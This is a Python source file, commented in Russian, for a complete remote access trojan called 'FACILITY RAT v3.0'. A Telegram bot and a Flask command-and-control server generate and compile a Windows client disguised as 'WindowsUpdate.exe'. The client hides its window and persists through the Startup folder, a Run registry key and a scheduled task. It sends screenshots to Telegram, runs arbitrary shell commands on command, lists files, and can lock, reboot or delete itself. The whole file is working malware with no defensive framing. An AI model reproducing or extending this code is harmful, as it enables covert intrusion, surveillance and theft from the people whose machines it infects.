import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import os
import sys
import requests
import sqlite3
import json
import subprocess
import shutil
import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

print(f"📍 Локальный IP сервера: {get_local_ip()}")
print(f"🌍 Внешний IP (если не в NAT): {requests.get('https://api.ipify.org').text}")

# ========== КОНФИГ В APPDATA ==========
APPDATA = os.getenv('LOCALAPPDATA', os.path.expanduser('~'))
CONFIG_DIR = os.path.join(APPDATA, 'Facility')
CONFIG_FILE = os.path.join(CONFIG_DIR, 'bot_config.json')

def ensure_config_dir():
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return None

def save_config(config):
    ensure_config_dir()
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=4)

def first_time_setup():
    print("\n" + "="*50)
    print("🔧 ПЕРВЫЙ ЗАПУСК БОТА")
    print("="*50)
    BOT_TOKEN = input("Введите токен Telegram бота: ").strip()
    SERVER_IP = input("Введите IP адрес этого сервера (для RAT): ").strip()
    config = {"BOT_TOKEN": BOT_TOKEN, "SERVER_IP": SERVER_IP, "API_PORT": 5000}
    save_config(config)
    return config

config = load_config()
if not config:
    config = first_time_setup()

BOT_TOKEN = config["BOT_TOKEN"]
SERVER_IP = config["SERVER_IP"]
API_PORT = config["API_PORT"]

# ========== ЗАГРУЗКА АДМИНОВ ==========
ALLOWED_USERS_URL = os.environ.get("ALLOWED_USERS_URL", "https://pastebin.com/raw/LZqAm5Ja")

def load_allowed_users():
    try:
        response = requests.get(ALLOWED_USERS_URL, timeout=5)
        if response.status_code == 200:
            user_ids = set()
            for line in response.text.strip().split():
                if line.strip().isdigit():
                    user_ids.add(int(line.strip()))
            if user_ids:
                return user_ids
    except:
        pass
    return {6778865145}

ALLOWED_USERS = load_allowed_users()
print(f"✅ Загружено админов: {len(ALLOWED_USERS)}")

bot = telebot.TeleBot(BOT_TOKEN)
devices = {}
user_sessions = {}

# ========== БАЗА ДАННЫХ ==========
DB_PATH = os.path.join(CONFIG_DIR, 'users.db')

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT UNIQUE,
        name TEXT,
        ip TEXT,
        os TEXT,
        first_seen TEXT,
        last_seen TEXT,
        status TEXT,
        total_connections INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()

def save_device_to_db(device_id, name, ip, os_name, status="online"):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("SELECT * FROM devices_history WHERE device_id = ?", (device_id,))
    existing = c.fetchone()
    if existing:
        c.execute("UPDATE devices_history SET last_seen = ?, status = ?, total_connections = total_connections + 1 WHERE device_id = ?", (now, status, device_id))
    else:
        c.execute("INSERT INTO devices_history (device_id, name, ip, os, first_seen, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?)", (device_id, name, ip, os_name, now, now, status))
    conn.commit()
    conn.close()

def update_device_status_in_db(device_id, status):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("UPDATE devices_history SET last_seen = ?, status = ? WHERE device_id = ?", (now, status, device_id))
    conn.commit()
    conn.close()

def get_all_devices_from_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT device_id, name, ip, os, first_seen, last_seen, status, total_connections FROM devices_history ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    return rows

init_db()

# ========== МЕНЮ ==========
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🖥️ УСТРОЙСТВА", callback_data="devices"),
        InlineKeyboardButton("📜 ИСТОРИЯ", callback_data="history"),
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats"),
        InlineKeyboardButton("🔧 СБОРКА RAT (EXE)", callback_data="build_exe")
    )
    return markup

def device_control_menu(device_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📸 СКРИНШОТ", callback_data=f"scr_{device_id}"),
        InlineKeyboardButton("💻 CMD", callback_data=f"cmd_{device_id}"),
        InlineKeyboardButton("📂 ФАЙЛЫ", callback_data=f"files_{device_id}"),
        InlineKeyboardButton("🔊 ЗВУК", callback_data=f"beep_{device_id}"),
        InlineKeyboardButton("🔒 БЛОКИРОВКА", callback_data=f"lock_{device_id}"),
        InlineKeyboardButton("🔄 ПЕРЕЗАГРУЗКА", callback_data=f"reboot_{device_id}"),
        InlineKeyboardButton("💣 ОСТАНОВИТЬ RAT", callback_data=f"stop_rat_{device_id}"),
        InlineKeyboardButton("❌ УДАЛИТЬ", callback_data=f"del_{device_id}")
    )
    markup.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="devices"))
    return markup

# ========== ПРОВЕРКА АКТИВНОСТИ ==========
def check_devices_activity():
    while True:
        time.sleep(5)
        current_time = time.time()
        for device_id, dev in list(devices.items()):
            last_seen = dev.get('last_seen', 0)
            old_status = dev.get('status', 'offline')
            new_status = 'online' if (current_time - last_seen <= 15) else 'offline'
            if old_status != new_status:
                devices[device_id]['status'] = new_status
                update_device_status_in_db(device_id, new_status)
                for admin_id in ALLOWED_USERS:
                    try:
                        bot.send_message(admin_id, f"{'🟢' if new_status == 'online' else '🔴'} {dev.get('name')} СТАЛ {'ОНЛАЙН' if new_status == 'online' else 'ОФФЛАЙН'}!")
                    except:
                        pass
        time.sleep(5)

threading.Thread(target=check_devices_activity, daemon=True).start()

# ========== ГЕНЕРАЦИЯ И БИЛД RAT В EXE ==========
def build_rat_exe(message):
    bot.send_message(message.chat.id, "🔧 **ГЕНЕРАЦИЯ RAT...**\nОтвечай на вопросы в Telegram.", parse_mode='Markdown')

    # Шаг 1: спрашиваем про иконку
    bot.send_message(message.chat.id, "🎨 **Менять иконку?**\nОтправь `да` или `нет`")

    @bot.message_handler(func=lambda msg: msg.chat.id == message.chat.id and msg.text.lower() in ['да', 'нет'])
    def handle_icon_choice(msg):
        change_icon = msg.text.lower() == 'да'

        if change_icon:
            bot.send_message(message.chat.id, "📸 **Отправь изображение для иконки**\n(PNG, JPG или ICO, до 1 МБ)")
            bot.register_next_step_handler(msg, process_icon)
        else:
            build_without_icon(msg)

    def process_icon(msg):
        if not msg.photo and not msg.document:
            bot.send_message(message.chat.id, "❌ Это не изображение. Отправь фото или файл.")
            return

        # Получаем файл
        if msg.photo:
            file_id = msg.photo[-1].file_id
        else:
            file_id = msg.document.file_id

        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # Сохраняем временный файл
        temp_icon_path = os.path.join(CONFIG_DIR, "temp_icon.png")
        with open(temp_icon_path, 'wb') as f:
            f.write(downloaded_file)

        # Конвертируем в .ico
        ico_path = os.path.join(CONFIG_DIR, "rat_icon.ico")
        try:
            from PIL import Image
            img = Image.open(temp_icon_path)
            img.save(ico_path, format='ICO', sizes=[(256,256)])
            bot.send_message(message.chat.id, "✅ Иконка сохранена! Начинаю сборку...")
            build_rat(message.chat.id, ico_path)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка конвертации: {e}")
            build_rat(message.chat.id, None)
        finally:
            if os.path.exists(temp_icon_path):
                os.remove(temp_icon_path)

    def build_without_icon(msg):
        bot.send_message(message.chat.id, "⏳ Сборка без иконки...")
        build_rat(message.chat.id, None)

    # Запускаем первый вопрос
    bot.register_next_step_handler(message, handle_icon_choice)

def build_rat(chat_id, icon_path=None):
    """Реальная компиляция RAT"""
    bot.send_message(chat_id, "⚙️ Компиляция... (до 30 секунд)")

    build_dir = os.path.join(CONFIG_DIR, "build_temp")
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)

    ADMIN_CHAT_ID = list(ALLOWED_USERS)[0] if ALLOWED_USERS else 6778865145

    rat_code = rf'''
import requests
import subprocess
import os
import sys
import time
import uuid
import platform
import threading
import socket
import io
import winreg
from PIL import ImageGrab
import winsound

if platform.system() == "Windows":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "{BOT_TOKEN}"
ADMIN_CHAT_ID = {ADMIN_CHAT_ID}
SERVER_IP = "{SERVER_IP}"
API_PORT = {API_PORT}
DEVICE_ID = str(uuid.getnode())
DEVICE_NAME = platform.node()
OS_NAME = platform.system() + " " + platform.release()

def add_to_all_autostarts():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
    try:
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        bat_path = os.path.join(startup, 'WindowsUpdateService.bat')
        with open(bat_path, 'w') as f:
            f.write(f'start "" "{{exe_path}}"\\nexit')
    except:
        pass
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass
    try:
        subprocess.run(f'schtasks /create /tn "WindowsUpdateTask" /tr "{{exe_path}}" /sc onlogon /f', shell=True, capture_output=True)
    except:
        pass

def send_to_telegram(text, photo_bytes=None):
    if photo_bytes:
        url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendPhoto"
        files = {{'photo': ('screenshot.png', photo_bytes, 'image/png')}}
        data = {{'chat_id': ADMIN_CHAT_ID, 'caption': text}}
        requests.post(url, data=data, files=files, timeout=10)
    else:
        url = f"https://api.telegram.org/bot{{BOT_TOKEN}}/sendMessage"
        data = {{'chat_id': ADMIN_CHAT_ID, 'text': text[:4000]}}
        requests.post(url, json=data, timeout=5)

def take_screenshot():
    img = ImageGrab.grab()
    bio = io.BytesIO()
    img.save(bio, 'PNG')
    bio.seek(0)
    send_to_telegram(f"📸 Скриншот с {{DEVICE_NAME}}", bio.getvalue())
    return "✅ Скриншот отправлен"

def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

def list_files():
    try:
        return "\\n".join(os.listdir("C:\\\\")[:30])
    except:
        return "Ошибка доступа"

def beep():
    winsound.Beep(1000, 500)
    return "🔊 Бип!"

def lock_pc():
    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
    return "🔒 ПК заблокирован"

def reboot_pc():
    subprocess.run("shutdown /r /t 5", shell=True)
    return "🔄 Перезагрузка через 5 секунд"

def run_file(path):
    try:
        os.startfile(path)
        return f"✅ Запущен: {{path}}"
    except Exception as e:
        return f"❌ Ошибка: {{e}}"

def selfdestruct():
    try:
        os.remove(sys.argv[0])
        os._exit(0)
    except:
        pass

def send_result(result):
    send_to_telegram(f"📟 {{DEVICE_NAME}}:\\n{{result[:3000]}}")

def register():
    try:
        data = {{"device_id": DEVICE_ID, "name": DEVICE_NAME, "ip": "direct", "os": OS_NAME}}
        requests.post(f"http://{{SERVER_IP}}:{{API_PORT}}/register", json=data, timeout=5)
    except:
        pass

def heartbeat():
    while True:
        try:
            requests.post(f"http://{{SERVER_IP}}:{{API_PORT}}/heartbeat", json={{"device_id": DEVICE_ID}}, timeout=5)
        except:
            pass
        time.sleep(30)

def get_command():
    try:
        r = requests.post(f"http://{{SERVER_IP}}:{{API_PORT}}/get_command", json={{"device_id": DEVICE_ID}}, timeout=5)
        return r.json().get('command'), r.json().get('value')
    except:
        return None, None

def command_loop():
    while True:
        cmd, value = get_command()
        if cmd:
            if cmd == "screenshot":
                take_screenshot()
            elif cmd == "cmd":
                send_result(execute_cmd(value))
            elif cmd == "files":
                send_result(list_files())
            elif cmd == "beep":
                send_result(beep())
            elif cmd == "lock":
                send_result(lock_pc())
            elif cmd == "reboot":
                send_result(reboot_pc())
            elif cmd == "run":
                send_result(run_file(value))
            elif cmd == "selfdestruct":
                selfdestruct()
                break
        time.sleep(2)

if __name__ == "__main__":
    add_to_all_autostarts()
    register()
    threading.Thread(target=heartbeat, daemon=True).start()
    threading.Thread(target=command_loop, daemon=True).start()
    while True:
        time.sleep(1)
'''

    py_file = os.path.join(build_dir, "rat_client.py")
    with open(py_file, 'w', encoding='utf-8') as f:
        f.write(rat_code)

    # Сборка через PyInstaller
    try:
        cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "WindowsUpdate", "--distpath", build_dir, "--workpath", os.path.join(build_dir, "build"), "--specpath", build_dir]

        if icon_path and os.path.exists(icon_path):
            cmd.append(f"--icon={icon_path}")

        cmd.append(py_file)
        subprocess.run(cmd, check=True, timeout=60, capture_output=True)

        exe_path = os.path.join(build_dir, "WindowsUpdate.exe")
        if os.path.exists(exe_path):
            with open(exe_path, 'rb') as f:
                bot.send_document(chat_id, f, caption="🔧 **RAT КЛИЕНТ (EXE)**\n✅ Готов к запуску!\n📌 Запусти на целевой машине", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "❌ Ошибка: EXE не создан")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка компиляции: {str(e)}")
    finally:
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)

# ========== КОМАНДЫ БОТА ==========
@bot.message_handler(commands=['start', 'menu'])
def start(message):
    if message.chat.id not in ALLOWED_USERS:
        bot.send_message(message.chat.id, "⛔ ACCESS DENIED!")
        return
    bot.send_message(message.chat.id, "🔐 FACILITY RAT v3.0\nВыбери действие:", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.message.chat.id not in ALLOWED_USERS:
        bot.answer_callback_query(call.id, "⛔ Нет доступа")
        return

    if call.data == "devices":
        show_devices(call)
    elif call.data == "history":
        show_history(call)
    elif call.data == "stats":
        show_stats(call)
    elif call.data == "build_exe":
        build_rat_exe(call.message)
        bot.answer_callback_query(call.id, "🔧 Компиляция RAT...")
    elif call.data.startswith("select_"):
        device_id = call.data[7:]
        dev = devices.get(device_id, {})
        status_icon = "🟢" if dev.get('status') == "online" else "🔴"
        text = f"{status_icon} **{dev.get('name')}**\n🆔 `{device_id}`\n🌍 IP: {dev.get('ip')}\n📡 Статус: {dev.get('status')}"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=device_control_menu(device_id))
    elif call.data.startswith("scr_"):
        device_id = call.data[4:]
        send_command_to_rat(device_id, "screenshot")
        bot.answer_callback_query(call.id, "📸 Команда отправлена")
    elif call.data.startswith("cmd_"):
        device_id = call.data[4:]
        msg = bot.send_message(call.message.chat.id, "💻 Введите команду CMD:")
        user_sessions[call.message.chat.id] = {'device_id': device_id, 'action': 'cmd'}
        bot.answer_callback_query(call.id, "💻 Ожидаю команду")
    elif call.data.startswith("files_"):
        device_id = call.data[6:]
        send_command_to_rat(device_id, "files")
        bot.answer_callback_query(call.id, "📂 Команда отправлена")
    elif call.data.startswith("beep_"):
        device_id = call.data[5:]
        send_command_to_rat(device_id, "beep")
        bot.answer_callback_query(call.id, "🔊 Бип!")
    elif call.data.startswith("lock_"):
        device_id = call.data[5:]
        send_command_to_rat(device_id, "lock")
        bot.answer_callback_query(call.id, "🔒 Блокировка")
    elif call.data.startswith("reboot_"):
        device_id = call.data[7:]
        send_command_to_rat(device_id, "reboot")
        bot.answer_callback_query(call.id, "🔄 Перезагрузка")
    elif call.data.startswith("stop_rat_"):
        device_id = call.data[9:]
        send_command_to_rat(device_id, "selfdestruct")
        bot.answer_callback_query(call.id, "💣 Остановка RAT...")
    elif call.data.startswith("del_"):
        device_id = call.data[4:]
        devices.pop(device_id, None)
        show_devices(call)

@bot.message_handler(func=lambda msg: msg.chat.id in ALLOWED_USERS and msg.chat.id in user_sessions)
def handle_command(msg):
    session = user_sessions.pop(msg.chat.id, None)
    if session and session['action'] == 'cmd':
        send_command_to_rat(session['device_id'], "cmd", msg.text)
        bot.send_message(msg.chat.id, f"✅ Команда '{msg.text}' отправлена")

def send_command_to_rat(device_id, command, value=None):
    if device_id not in devices:
        return False
    devices[device_id]['pending_command'] = {"command": command, "value": value}
    return True

def show_devices(call):
    if not devices:
        bot.edit_message_text("❌ Нет активных устройств", call.message.chat.id, call.message.message_id)
        return
    markup = InlineKeyboardMarkup(row_width=1)
    for dev_id, dev in devices.items():
        status = "🟢" if dev.get('status') == "online" else "🔴"
        markup.add(InlineKeyboardButton(f"{status} {dev.get('name')}", callback_data=f"select_{dev_id}"))
    markup.add(InlineKeyboardButton("🔄 ОБНОВИТЬ", callback_data="devices"))
    bot.edit_message_text("📱 **АКТИВНЫЕ УСТРОЙСТВА:**", call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

def show_history(call):
    rows = get_all_devices_from_db()
    if not rows:
        bot.edit_message_text("📜 История пуста", call.message.chat.id, call.message.message_id)
        return
    text = "📜 **ИСТОРИЯ ПОДКЛЮЧЕНИЙ**\n\n"
    for row in rows[:10]:
        device_id, name, ip, os_name, first_seen, last_seen, status, conn_count = row
        status_icon = "🟢" if status == "online" else "🔴"
        text += f"{status_icon} **{name}**\n🆔 `{device_id}`\n🌍 {ip}\n📅 Первое: {first_seen}\n🔄 Последнее: {last_seen}\n📊 Подключений: {conn_count}\n\n"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')

def show_stats(call):
    rows = get_all_devices_from_db()
    total = len(rows)
    online = sum(1 for r in rows if r[6] == "online")
    total_conn = sum(r[7] for r in rows)
    text = f"📊 **СТАТИСТИКА**\n\n🖥️ Всего: {total}\n🟢 Онлайн: {online}\n🔴 Оффлайн: {total - online}\n📡 Подключений: {total_conn}"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')

# ========== API ==========
app = Flask(__name__)

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    name = data.get('name')
    ip = data.get('ip')
    os_name = data.get('os')
    devices[device_id] = {'name': name, 'ip': ip, 'os': os_name, 'status': 'online', 'last_seen': time.time(), 'pending_command': None}
    save_device_to_db(device_id, name, ip, os_name, "online")
    print(f"[+] {name} зарегистрирован")
    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    device_id = request.json.get('device_id')
    if device_id in devices:
        devices[device_id]['status'] = 'online'
        devices[device_id]['last_seen'] = time.time()
        update_device_status_in_db(device_id, "online")
    return jsonify({"status": "ok"})

@app.route('/get_command', methods=['POST'])
def get_command():
    device_id = request.json.get('device_id')
    if device_id in devices and devices[device_id].get('pending_command'):
        cmd = devices[device_id]['pending_command']
        devices[device_id]['pending_command'] = None
        return jsonify(cmd)
    return jsonify({"command": None, "value": None})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    device_id = data.get('device_id')
    result = data.get('result')
    print(f"[+] Результат от {device_id}: {result[:100]}")
    for admin_id in ALLOWED_USERS:
        try:
            bot.send_message(admin_id, f"📟 {result[:3000]}")
        except:
            pass
    return jsonify({"status": "ok"})

def run_api():
    app.run(host='0.0.0.0', port=API_PORT, debug=False, use_reloader=False)

threading.Thread(target=run_api, daemon=True).start()
print("✅ Бот запущен")
bot.infinity_polling()
